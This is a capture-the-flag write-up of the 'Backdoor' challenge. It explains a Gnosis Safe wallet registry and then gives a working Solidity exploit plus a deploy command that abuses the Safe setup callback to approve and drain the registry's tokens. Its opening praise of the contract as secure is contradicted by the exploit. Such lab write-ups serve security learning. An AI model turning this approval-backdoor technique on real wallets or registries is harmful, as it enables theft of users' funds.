The `WalletRegistry` contract is a registry for **Gnosis Safe wallets**. Its purpose is to store and manage the deployment of legitimate Gnosis Safe wallets and distribute a certain amount of tokens to the registered wallets.

**The contract is designed to ensure that only legitimate Gnosis Safe wallets are stored in the registry**. It has embedded verifications and checks to enforce this.

The contract constructor takes the addresses of the `masterCopy` (the Gnosis Safe master copy contract), `walletFactory` (the factory contract used to create Gnosis Safe wallets), token (the ERC20 token contract), and an array of initial beneficiaries.

`addBeneficiary() :` Allows the contract owner to add a new beneficiary to the beneficiaries mapping.

`proxyCreated() :` This function is executed when a user creates a Gnosis Safe wallet using the `GnosisSafeProxyFactory` contract and sets the registry's address as the callback. This function performs various verifications and checks to ensure the wallet is legitimate and then registers the wallet under the owner's address in the `wallets` mapping. It also transfers a certain amount of tokens to the newly created wallet.

`_getFallbackManager() :` Retrieves the fallback manager address of a Gnosis Safe wallet.
 

Overall, the `WalletRegistry` contract provides a secure and controlled environment for deploying and registering Gnosis Safe wallets, ensuring that only legitimate wallets are stored in the registry and distributing tokens to the registered wallets.

Challenge's message:

> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
Your goal is to take all funds from the registry. In a single transaction.

# Subverting

```solidity

contract Callback {
    function callback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}


contract AttackBackdoor {
    constructor(address[] memory _users,address _walletRegistry ) {

        Callback callback = new Callback();
        WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);
        IERC20 token = walletRegistry.token();
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());

        for (uint i = 0; i < _users.length;) {       
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1, address(callback), abi.encodeWithSelector(Callback.callback.selector, address(token), address(this), 10e18),address(0), address(0), 0, address(0));
            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(walletRegistry.masterCopy(),init, i,IProxyCreationCallback(_walletRegistry));
            require(token.allowance(address(safeProxy), address(this)) == 10e18);
            token.transferFrom(address(safeProxy), msg.sender, 10e18);
            unchecked{++i;}
        }
    }
}
```

Here is the attacker command:

```js
await (await ethers.getContractFactory('AttackBackdoor', player)).deploy(
            users, walletRegistry.address, {gasLimit: 30000000}
);
```

Solve the challenge.
